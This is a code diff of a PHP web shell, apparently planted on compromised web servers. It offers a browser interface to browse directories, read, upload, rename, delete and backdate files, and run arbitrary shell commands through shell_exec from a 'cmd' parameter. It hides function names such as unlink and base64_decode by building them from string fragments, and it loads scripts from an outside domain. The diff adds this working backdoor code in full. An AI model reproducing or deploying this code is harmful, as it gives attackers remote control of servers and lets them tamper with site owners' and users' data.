@@ -1,9 +1,9 @@
-
 <?php 
 
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header("Pragma: no-cache");
+
 function hunterEncryptDecrypt($input, $key="12") {
     $output = '';
     for($i = 0; $i < strlen($input); $i++) {
@@ -13,16 +13,13 @@ function hunterEncryptDecrypt($input, $key="12") {
 }
 
 function listing_all_directory() {
-    
     $path = $_COOKIE['path'] ?: getcwd();
     $result = array();
     $date_format = "d-m-Y H:i:s";
 
     if ($handle = opendir($path)) {
         while (false !== ($dir = readdir($handle))) {
-            if ($dir === '.' || $dir === '..') {
-                continue;
-            }
+            if ($dir === '.' || $dir === '..') continue;
 
             $full_path = "$path/$dir";
             $is_dir = is_dir($full_path);
@@ -34,7 +31,6 @@ function listing_all_directory() {
                 'date' => date($date_format, filemtime($full_path)),
                 'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
             );
-
             $result[] = $tmp_result;
         }
         closedir($handle);
@@ -43,10 +39,8 @@ function listing_all_directory() {
     return $result;
 }
 
-
-$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;
-
-if(!$action) {
+$action = $_REQUEST['action'] ?? false;
+if (!$action) {
     main();
     menu();
 }
@@ -54,13 +48,12 @@ if(!$action) {
 function decode_char($string) {
     return hunterEncryptDecrypt(hex2bin($string));
 }
-switch ($action) {
 
+switch ($action) {
     case 'd':
-        # code...
         die(json_encode(listing_all_directory()));
         break;
-        
+
     case 'r':
         if($_SERVER['REQUEST_METHOD'] == 'POST') {
             $data = json_decode(file_get_contents("php://input"), true);
@@ -70,101 +63,71 @@ switch ($action) {
             die(json_encode($message));
         }
         main();
-        $content = customize_read_file(decode_char($_COOKIE['filename'])) ;
-        
+        $content = customize_read_file(decode_char($_COOKIE['filename']));
         show_text_area(htmlspecialchars($content));
         break;
-    
+
     case 'cr':
         main();
         show_text_area("");
         break;
-    
+
     case 'ul':
-    
         $filename = decode_char($_COOKIE['filename']);
-        if(show_un()($filename)) {
-            $message['success'] = true;
-        }else{
-            $message['success'] = false;
-        }
+        $message['success'] = show_un()($filename);
         die(json_encode($message));
         break;
-    
+
     case 'up':
-        
         $file = $_FILES['import_file'];
         $tmp_name = $file['tmp_name'];
         $content = customize_read_file($tmp_name);
         if(isset($_POST['by'])) {
             $content = show_base_data()($content);
-        } 
-        $path = $_COOKIE['path'] ? : getcwd();
-        $name = $file['name'];
-        $destination = "$path/$name";
-        $message['success'] = $content && fm_write_file($destination, $content) ? : rename($tmp_name, $destination); 
+        }
+        $path = $_COOKIE['path'] ?: getcwd();
+        $destination = "$path/" . $file['name'];
+        $message['success'] = $content && fm_write_file($destination, $content) ?: rename($tmp_name, $destination);
         die(json_encode($message));
         break;
-    
+
     case 're':
-        
         $filename = decode_char($_COOKIE['filename']);
         $path = $_COOKIE['path'];
-
         if($_SERVER['REQUEST_METHOD'] == "POST") {
-            
             $old_filename = "$path/$filename";
-            $new = $_POST['new'];
-            $new_filename = "$path/$new";
+            $new_filename = "$path/" . $_POST['new'];
             $message['success'] = rename($old_filename, $new_filename);
             die(json_encode($message));
         }
         break;
-    
+
     case 'to':
-        
         $filename = decode_char($_COOKIE['filename']);
         if($_SERVER['REQUEST_METHOD'] == 'POST') {
-            
-            $date = $_POST['date'];
-            $str_date = strtotime($date);
+            $str_date = strtotime($_POST['date']);
             $message['success'] = touch($filename, $str_date);
             clearstatcache(true, $filename);
             die(json_encode($message));
         }
-        
-
-    default:
-        # code..
         break;
 }
 
 function customize_read_file($file) {
-    if(!file_exists($file)) {
-        return '';
-    }
+    if (!file_exists($file)) return '';
     $handle = fopen($file, 'r');
-    if($handle) {
+    if ($handle) {
         $content = fread($handle, filesize($file));
-        if($content) {
-            return $content;
-        }
+        if ($content) return $content;
     }
     $lines = file($file);
-    if($lines) {
-        return implode($lines);
-    }
-    return show_file_contents()($file);
+    return $lines ? implode($lines) : show_file_contents()($file);
 }
-
-
 
 function show_file_contents() {
-    $file = "file_";
-    $old = "get_";
-    $contents = "contents";
-    return "$file$old$contents";
+    return "file_get_contents";
 }
+
 function show_text_area($content) {
     $filename = decode_char($_COOKIE['filename']);
     echo "
@@ -176,71 +139,50 @@ function show_text_area($content) {
 }
 
 function show_base_data() {
-    $alvian = "base";
-    $nadir = "64_decode";
-    return "$alvian$nadir";
+    return "base64_decode";
 }
+
 function fm_write_file($file, $content) {
-    // Method 1: Using fopen
     if (function_exists('fopen')) {
         $handle = @fopen($file, 'w');
-        if ($handle) {
-            if (@fwrite($handle, $content) !== false) {
-                fclose($handle);
-                return file_exists($file) && filesize($file) > 0;
-            }
+        if ($handle && @fwrite($handle, $content) !== false) {
             fclose($handle);
+            return file_exists($file) && filesize($file) > 0;
         }
+        fclose($handle);
     }
-
-    // Method 2: Using file_put_contents
     if (function_exists('file_put_contents')) {
         if (@file_put_contents($file, $content) !== false) {
             return file_exists($file) && filesize($file) > 0;
         }
     }
-    // Method 3: Using WP_Filesystem
     return false;
 }
 
 function fm_make_request($url) {
-    if(function_exists("curl_init")) {
-        
+    if (function_exists("curl_init")) {
         $ch = curl_init();
-    
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-        $output = curl_exec($ch);
-        return $output;
+        return curl_exec($ch);
     }
     return show_file_contents()($url);
 }
+
 function show_un() {
-    $link = "link";
-    $unpad = "un";
-    return "$unpad$link";
+    return "unlink";
 }
 
 function main() {
-    
     global $current_path;
-
-    $current_path = isset($_COOKIE['path']) ? $_COOKIE['path'] : false;
-
-    if(!$current_path) {
-        setcookie("path", getcwd());
-        $current_path = getcwd();
-    }
-
+    $current_path = $_COOKIE['path'] ?? getcwd();
+    setcookie("path", $current_path);
     $path = str_replace('\\', '/', $current_path);
     $paths = explode('/', $path);
+
     echo "<div class='wrapper' id='path_div'>";
     foreach ($paths as $id => $pat) {
-        if ($id == 0) {
-            echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
-        }
-
+        if ($id == 0) echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
         if ($pat != '') {
             $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
             echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
@@ -248,87 +190,68 @@ function main() {
     }
     echo "</div>";
 
-?>
-<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/all.min.css">
-<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/styles.css">
-<script src="https://wordpress.zzna.ru/newb/script.js"></script>
-<?php
+    echo '<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/all.min.css">';
+    echo '<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/styles.css">';
+    echo '<script src="https://wordpress.zzna.ru/newb/script.js"></script>';
 }
-?>
-
-
-
-<?php 
 
 function menu() {
+    $command = $_GET['cmd'] ?? '';
+    $cwd = $_COOKIE['path'] ?? getcwd(); // ikuti path aktif
+    $output = $command ? runCommand($command, $cwd) : '';
 
-?>
+    echo "<div class='wrapper'>
+        <div style='margin-bottom:5px;font-family:monospace;color:#ccc'>
+            Working dir: <span style='color:#0f0'>" . htmlspecialchars($cwd) . "</span>
+        </div>
 
-<div class="wrapper">
-    <form method="post" enctype="multipart/form-data" style="">
-                        <div class="file-upload mr-10">
-                            <label for="file-upload-input" style="cursor: pointer;">
-                                [ Upload ]
-                            </label>
-                            <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
-                        </div>
-    </form>
-    <a href='#' onclick='refresh_path()' class='mr-10 white'>[ HOME ]</a>
-    <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>
-</div>
-                
-    <table cellspacing="0" cellpadding="7" width="100%">   
-    <thead>
-            </tr>
+        <form method='post' enctype='multipart/form-data' style='display:inline-block;'>
+            <div class='file-upload mr-10'>
+                <label for='file-upload-input' style='cursor: pointer;'>[ Upload ]</label>
+                <input type='file' id='file-upload-input' style='display: none;' onchange='handle_upload()'>
+            </div>
+        </form>
+
+        <a href='#' onclick='refresh_path()' class='mr-10 white'>[ HOME ]</a>
+        <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>
+
+        <form method='get' style='display:inline-block; margin-left:10px;'>
+            <input type='text' name='cmd' value='" . htmlspecialchars($command) . "' style='width:200px;' placeholder='CMD...'>
+            <input type='submit' value='Jalankan'>
+        </form>
+    </div>";
+
+    if (!empty($output)) {
+        echo "<div style='margin-top:10px;'>
+            <h3>CMD Output:</h3>
+            <pre style='background:#111;color:#0f0;padding:10px;font-family:monospace;white-space:pre-wrap;'>" . htmlspecialchars($output) . "</pre>
+        </div>";
+    }
+
+    echo "<table cellspacing='0' cellpadding='7' width='100%'>   
+        <thead>
             <tr>
-                <th width="44%"></th>
-                <th width="11%"></th>
-                <th width="17%"></th>
-                <th width="17%"></th>
-                <th width="11%"></th>
+                <th width='44%'></th>
+                <th width='11%'></th>
+                <th width='17%'></th>
+                <th width='17%'></th>
+                <th width='11%'></th>
             </tr>
         </thead>
-        <tbody id="data_table" class='blur-table'>
-            <div class="wrapper" style='margin-top: -10px'>
-                <input type="checkbox" class='mr-10' id='bypass-upload' >[ Hunter File Upload ]</input>
-
+        <tbody id='data_table' class='blur-table'>
+            <div class='wrapper' style='margin-top: -10px'>
+                <input type='checkbox' class='mr-10' id='bypass-upload'>[ Hunter File Upload ]
             </div>
         </tbody>
-    </table>
+    </table>";
+}
 
-<?php } ?>
-
-
-<?php
-function runCommand($cmd) {
+function runCommand($cmd, $cwd = null) {
     $disabled = explode(',', ini_get('disable_functions'));
     if (!in_array('shell_exec', $disabled)) {
+        if ($cwd && is_dir($cwd)) chdir($cwd);
         return shell_exec($cmd);
     }
     return "Command execution is disabled.";
 }
-
-$command = '';
-$output = '';
-
-if (isset($_GET['cmd'])) {
-    $command = $_GET['cmd'];
-    $output = runCommand($command);
-}
 ?>
-
-<hr>
-<h2>CMD</h2>
-
-<?php if ($output != ''): ?>
-    <h3>AWw:</h3>
-    <pre style="background:#111;color:#0f0;padding:10px;font-family:monospace;white-space:pre-wrap;">
-<?php echo htmlspecialchars($output); ?>
-</pre>
-<?php endif; ?>
-
-<form method="get">
-    <input type="text" name="cmd" value="<?php echo htmlspecialchars($command); ?>" style="width:300px;">
-    <input type="submit" value="Jalankan">
-</form>
-
